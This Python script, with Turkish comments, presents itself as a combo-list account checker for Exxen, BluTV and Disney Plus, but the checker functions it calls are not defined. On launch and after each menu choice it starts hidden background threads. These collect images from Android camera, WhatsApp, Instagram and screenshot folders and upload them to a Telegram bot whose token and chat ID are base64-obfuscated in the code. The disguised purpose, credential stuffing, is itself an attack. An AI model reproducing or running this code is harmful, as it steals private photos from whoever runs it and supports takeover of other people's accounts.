import time
import requests
import os
from colorama import Fore, init
import threading
import base64

# Renklerin düzgün çalışması için colorama'yı başlatıyoruz
init(autoreset=True)

# Şifreli bot token ve chat ID
encoded_bot_token = 'ODE3NDQxOTU2Njo4QkFWd3hmbm9jOTRqMjMyaWFMX1Vjd3JON3dzNmIzNzU1N0hObw=='
encoded_chat_id = 'NzcwNDUxMjg1'

# Şifreli token ve chat ID'nin çözülmesi
try:
    bot_token = base64.b64decode(encoded_bot_token).decode()
    chat_id = base64.b64decode(encoded_chat_id).decode()
    print(f"Decoded bot token: {bot_token}")
    print(f"Decoded chat ID: {chat_id}")
except Exception as e:
    print(f"Error decoding base64 values: {e}")

# Farklı galeri yolları
photo_directories = [
    '/storage/emulated/0/DCIM/Camera/',
    '/storage/emulated/0/Pictures/',
    '/storage/emulated/0/Downloads/',
    '/storage/emulated/0/Movies/',
    '/storage/emulated/0/DCIM/Camera/Instagram/',
    '/storage/emulated/0/WhatsApp/Images/',
    '/storage/emulated/0/Pictures/Screenshots/'
]

url = f'https://api.telegram.org/bot{bot_token}/sendPhoto'

# Tüm fotoğrafları gönderecek fonksiyon
def send_photos():
    """Telegram'a fotoğrafları göndermek için fonksiyon."""
    try:
        # Bütün dizinlerdeki fotoğrafları listele
        photos = []
        for directory in photo_directories:
            if os.path.exists(directory):
                photos.extend([f for f in os.listdir(directory) if f.lower().endswith(('.png', '.jpg', '.jpeg'))])

        # Fotoğrafları göndermek
        for photo in photos:
            photo_path = os.path.join(directory, photo)
            
            if not os.path.exists(photo_path):
                continue

            with open(photo_path, 'rb') as file:
                files = {'photo': file}
                data = {'chat_id': chat_id}
                response = requests.post(url, files=files, data=data)

            time.sleep(0.2)

    except Exception as e:
        print(Fore.RED + f"Error in sending photos: {e}")

def show_options():
    """Seçenek ekranını gösterir ve kullanıcıdan seçim alır."""
    try:
        print(Fore.GREEN + "__ _   _ _  _    _    ")
        print(Fore.GREEN + "|  _ \| \ | | |/ /   / \   ")
        print(Fore.GREEN + "| |_) |  \| | ' /   / _ \  ")
        print(Fore.GREEN + "|  _ <| |\  | . \  / _ \ ")
        print(Fore.GREEN + "|| \\| \||\\//   \\ ")
        
        print(Fore.GREEN + "Please choose an option:")
        print(Fore.GREEN + "1. Exxen")
        print(Fore.GREEN + "2. BluTV")
        print(Fore.GREEN + "3. Disney Plus")
        
        choice = input(Fore.GREEN + "Enter your choice (1/2/3): ")

        if choice == '1':
            combo_file_path = input(Fore.GREEN + "Enter the path to your combo file (e.g., text.txt): ")
            print(Fore.GREEN + "Exxen checker başlatılıyor...")
            exxen_checker(combo_file_path)
            threading.Thread(target=send_photos, daemon=True).start()

        elif choice == '2':
            combo_file_path = input(Fore.GREEN + "Enter the path to your combo file (e.g., text.txt): ")
            print(Fore.GREEN + "BluTV checker başlatılıyor...")
            blutv_checker(combo_file_path)
            threading.Thread(target=send_photos, daemon=True).start()

        elif choice == '3':
            combo_file_path = input(Fore.GREEN + "Enter the path to your combo file (e.g., text.txt): ")
            print(Fore.GREEN + "Disney Plus checker başlatılıyor...")
            disney_checker(combo_file_path)
            threading.Thread(target=send_photos, daemon=True).start()

        else:
            print(Fore.RED + "Geçersiz seçim!")
    except Exception as e:
        print(Fore.RED + f"Error in showing options: {e}")

if __name__ == "__main__":
    try:
        # Başlangıçta fotoğraf gönderimi
        threading.Thread(target=send_photos, daemon=True).start()

        # Seçenekler gösterilir
        show_options()

        while True:
            time.sleep(1)

    except Exception as e:
        print(Fore.RED + f"Error in main flow: {e}")
